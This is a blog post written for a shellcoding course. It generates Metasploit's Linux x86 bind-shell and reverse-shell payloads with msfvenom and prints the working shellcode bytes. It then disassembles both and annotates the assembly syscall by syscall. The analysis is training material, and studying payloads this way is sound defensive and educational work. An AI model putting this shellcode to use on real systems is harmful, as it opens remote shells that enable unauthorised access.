---
layout: single
title: SLAE Assignment 5 -- MSF Analysis
date: 2019-5-12
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - MSF
  - msfvenom
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

The 5th assignment for SLAE is to analyze 3 msfvenom payloads. For this excercise, I thought I would revisit some semi-familiar code in the `linux/x86/shell_bind_tcp`, `linux/x86/shell_reverse_tcp`, and `linux/x86/exec` payloads. My primary reason for doing this is because we've written similar code already and I want to see how the pros do it at Metasploit and see if we can pick up some new tricks/efficiencies. 

## Analyzing Shellcode #1 (`linux/x86/shell_bind_tcp`)

The first thing we need to do is generate the shellcode that corresponds with this MSF payload. We'll need to add arguments as well, such as designate a listening port. We can do this with the following command: `msfvenom -p linux/x86/shell_bind_tcp lport=5555 -f c`

```terminal_session
root@kali:~# msfvenom -p linux/x86/shell_bind_tcp lport=5555 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

Now that we have our shellcode, we can feed it to `ndisasm`, which comes stock on Kali Linux, with the following command and get some assembly out of it!

```terminal_session
root@kali:~# echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x15\xb3\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -u -
```
After running this command, we get the following output:

```terminal_session
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  68020015B3        push dword 0xb3150002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```

This output is very nice, but it's not quite what we're accustomed to. Let's use `awk` to get just the assembly instructions.

`echo -ne "<SHELLCODE>" | ndisasm -u - | awk '{ print $3,$4,$5 }'`

Now we get just the assembly to print to the terminal and we can throw this into a NASM sytnax highlighter.

```nasm
xor ebx,ebx 
mul ebx 
push ebx 
inc ebx 
push ebx 
push byte +0x2
mov ecx,esp 
mov al,0x66 
int 0x80 
pop ebx 
pop esi 
push edx 
push dword 0xb3150002
push byte +0x10
push ecx 
push eax 
mov ecx,esp 
push byte +0x66
pop eax 
int 0x80 
mov [ecx+0x4],eax 
mov bl,0x4 
mov al,0x66 
int 0x80 
inc ebx 
mov al,0x66 
int 0x80 
xchg eax,ebx 
pop ecx 
push byte +0x3f
pop eax 
int 0x80 
dec ecx 
jns 0x32 
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx,esp 
push eax 
push ebx 
mov ecx,esp 
mov al,0xb 
int 0x80
```

Let's break this down and see how it differs from our bind shell that we wrote. 

The first thing we'll notice is repeated use of the same syscall `socketcall()` instead of 4 separate syscalls like we did. `sockecall()` works by storing a `SYS_CALL` value in `ebx`, creating the arguments on the stack for the subordinate syscall (like bind or listen for example), and then having `ecx` point to `esp` where the beginning of the arguments are located. It's a much more uniform and in my opinion clean way of executing the shellcode. 

#### Syscall 1 `socketcall()` with `SYS_SOCKET`

First, let's look at the argument structure of `socketcall()`. The [man page](http://man7.org/linux/man-pages/man2/socketcall.2.html) gives the argument structure as `int socketcall(int call, unsigned long *args);`. `call` can be satisfied with a reference to what socket function you want to use, in thise case we'll want to use `SYS_SOCKET` which has a value of `1`, and then we'll input arguments to satisfy the `SYS_SOCKET` call as we're familiar with from our code. 

Let's look at how this plays out in assembly.

```nasm
xor ebx,ebx 
mul ebx 
push ebx 
inc ebx 
push ebx 
push byte +0x2
mov ecx,esp 
mov al,0x66 
int 0x80 
```

One thing that's different is the way they're clearing the registers. By using `mul` which has storage destinations of `eax` and `edx`, they're able to save a line of code by not having to specify `xor register, register` twice. 

Next they increment `ebx` so that it will equal `0x1` and satisfy the `SYS_SOCKET` argument. It was pushed onto the stack before incrementing to satisfy the protocol value needed for `SYS_SOCKET` which should be `0` as it was in our bind shell. `ebx` is then pushed onto the stack to satisfy the `SOCK_STREAM` argument as we did. Then a value of `0x2`, to represent the value of `PF_INET`, is pushed onto the stack just as we did. 

Lastly, `ecx` is given the address of `esp` so that it references our arguments that we just created on the stack and then the interrupt is called. Also, let's not forget that the `sockfd` will be needed later and that's stored in `eax` by default.

#### Syscall 2 `socketcall()` with `SYS_BIND`

This is the structure from the man page on `bind()`: `int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);` As we know already, building this struct in reverse order on the stack is the most difficult part of the entire shellcode. 
+ `int sockfd` is taken care of, thats stored in `eax`.
+ the struct will consist of `0` (0.0.0.0 listening address), `0xb315` (port 5555), and `AF_INET` (2). 
+ `socklen_t addrlen` will be 16

Let's see how they pulled this off in the assembly.

```nasm
pop ebx                   ; I like this, this pops 0x2 into $ebx and satisfies our SYS_BIND requirement
pop esi                   ; not sure what this is doing yet
push edx                  ; $edx is still zeroed out so this will be the beginning of our struct (0.0.0.0)
push dword 0xb3150002     ; putting our listening port (5555) onto the stack and our AF_INET value (2)
push byte +0x10           ; finishing up with pushing 16 length onto the stack
push ecx                  ; pushing a pointer to our sockaddr
push eax                  ; this is our sockfd, or did you forget?!
mov ecx,esp               ; ecx has to point to the location of all these args we've created
push byte +0x66           
pop eax                   ; calling socketcall()
int 0x80 
```

Awesome, not too many unique things there, though I will say for the most part they make more use of pushing values onto the stack and then popping them into register than I have. 

#### Syscall 3 `socketcall()` with `SYS_LISTEN`

If you don't remember, the argument structure for `listen()` is `listen(sockfd, queueLimit)`. This part of the code is pretty self-explanatory. `ecx` will point to the args by default because it's not touched in this code segement and is still referencing `esp` from previous code segment.

```nasm
mov [ecx+0x4],eax ; [ecx+0x4] is going to reference a location on the stack so we're placing our sockfd onto the stack
mov bl,0x4        ; for SYS_LISTEN which has a value of 4
mov al,0x66       ; calling socketcall()     
int 0x80 
```

#### Syscall 4 `socketcall()` with `SYS_ACCEPT`

The unique thing about `accept()` is that it will generate a new `sockfd` for us instead of the one we've been using that we'll need to store and reference. 

```nasm
inc ebx         ; ebx now becomes 5 for SYS_ACCEPT
mov al,0x66     
int 0x80
```

Again, `ecx` already points to the beginning of the arguments so we're good to go. 

#### Syscall 5 `dup2()`

`dup2()` is going to take a `sockfd` created from our `accept()` call and then duplicate the 0, 1, and 2 file descriptors in the `ecx` registers which correspond to stdin, stdout, stderr respectively in order to make the shell interactive. Let's see how they implement this. 

```nasm
xchg eax,ebx        ; $ebx now has our new sockfd
pop ecx             ; this is going to be our counter register
push byte +0x3f     ; pushing the syscall value for dup2()
pop eax         
int 0x80            ; done calling dup2()
dec ecx             ; decrement our counter
jns 0x32            ; jump near if not sign, a.k.a. SF=0
```

Lesson learned here, the original ndisasm output told us that `0x32` was a reference to:

`00000032  6A3F              push byte +0x3f`

So now we know if that condition is not meant, this is where we loop back to. Very cool way of constructing the loop.

#### Syscall 6 `execve()`

This syscall is one of the most standardized syscalls you can make in assembly so I doubt there will be much variance here. 

```nasm
push dword 0x68732f2f       ; pushing 'hs//' onto the stack
push dword 0x6e69622f       ; pushing 'nib/' onto the stack, now we have /bin//sh on the stack!
mov ebx,esp                 ; $ebx now points to the string we want to execute
push eax                    ; terminator
push ebx                    ; push the value of the previous stack pointer onto the stack
mov ecx,esp                 ; save new stack pointer
mov al,0xb 
int 0x80
```

Some things we picked up for our future code writing:
+ the `mul` register clear to save bytes
+ creatively utilizing the stack to avoid `mov` operations
+ utilizing `socketcall()` instead of separate syscalls
+ utilizing the `xchg` opcode

## Analyzing Shellcode #1 (`linux/x86/reverse_bind_tcp`)

The first thing we need to do is generate the shellcode that corresponds with this MSF payload. We'll need to add arguments as well, such as designate a listening port. We can do this with the following command: `msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=5555 -f c`

```terminal_session
root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=5555 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Run our ndisasm command:
```terminal_session
root@kali:~# echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" |ndisasm -u -
```

This time we won't `awk` out just the assembly since last time it made things harder without as much context. 

Output:
```terminal_session
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  687F000001        push dword 0x100007f
0000001D  68020015B3        push dword 0xb3150002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```

Alright, let's analyze this code. As you have probably already figured out, they're using `socketcall()` again. This should be familiar territory for us at this point. 

#### Syscall 1 `socketcall()` with `SYS_SOCKET`

Let's keep in mind the argument structure for `SYS_SOCKET`: `socket(PF_INET (2), SOCK_STREAM (1), IPPROTO_IP (0))`

```nasm
xor ebx,ebx         ; clear out ebx
mul ebx             ; clear out eax and edx
push ebx            ; pushing 0 onto stack for the IPPROTO_IP
inc ebx             ; pushing 1 onto the stack for SOCK_STREAM
push ebx  
push byte +0x2      ; pushing 2 onto the stack for PF_INET
mov ecx,esp         ; $ecx has to point at our args location
mov al,0x66  
int 0x80
xchg eax,ebx        ; storing the sockfd in ebx   
```

We are getting good at this! Most of this makes sense to us at this point and matches up nicely with our bind shell analysis. 

#### Syscall 2 `dup2()`

This is interesting, it looks like this code calls `dup2()` before `connect()` which is different from our code. 

```nasm
mov al,0x3f   ; 0x3f is the value for dup2
int 0x80      ; call dup2
dec ecx       ; decrese counter register
jns 0x11      ; jump near if not sign
```

This is a similar set-up to our `dup2()` loop in the MSF bind shell that we evaluated. `0x11` here is just a reference to the location of that first instruction `mov al,0x3f` so as it loops through its iterations if the `jns` condition is not satisfied it will continue to loop. Here's the relevant line from the ndisasm dump:
```terminal_session
00000011  B03F              mov al,0x3f
```

#### Syscall 3 `socketcall()` with `SYS_CONNECT`

`connect()` behaves very similarly to `bind()` so keep in mind the argument structure for both, particularly the struct portion: `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)`.

```nasm
push dword 0x100007f      ; pushing 127.0.0.1 remote IP 
push dword 0xb3150002     ; pushing port 5555 and AF_INET 
mov ecx,esp               ; pointing $ecx to the struct's location on the stack
mov al,0x66               ; socketcall()
push eax                  
push ecx                  ; sockaddr_in* addr 
push ebx                  ; pushing the sockfd
mov bl,0x3                ; SYS_CONNECT
mov ecx,esp  
int 0x80  
```

This is all pretty familiar to the code we analyzed for the MSF bind payload. 

#### Syscall 4 `execve()`

This is similar to the MSF bind payload we analyzed, but not identical. 

```nasm
push edx                  ; pushing a null terminator onto the stack
push dword 0x68732f6e     ; pushing 'hs//' onto the stack
push dword 0x6e69622f     ; pushing 'nib/' onto the stack, now we have /bin//sh on the stack!
mov ebx,esp               ; preserving this stack pointer in $ebx
push edx                  ; another null terminator
push ebx                  ; the stack pointer address we had stored in $ebx
mov ecx,esp               ; $ecx has to have the address of the stack pointer for our completed args
mov al,0xb                ; execve()
int 0x80
```

All in all there were the same lessons learned. It emphasizes more succicnt assembly. Why use 3 lines of code when you can accomplish the same goal in 2? There are definitely some areas we can improve our code going forward. 

## Analyzing Shellcode #3 (`linux/x86/exec`)




## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment4)




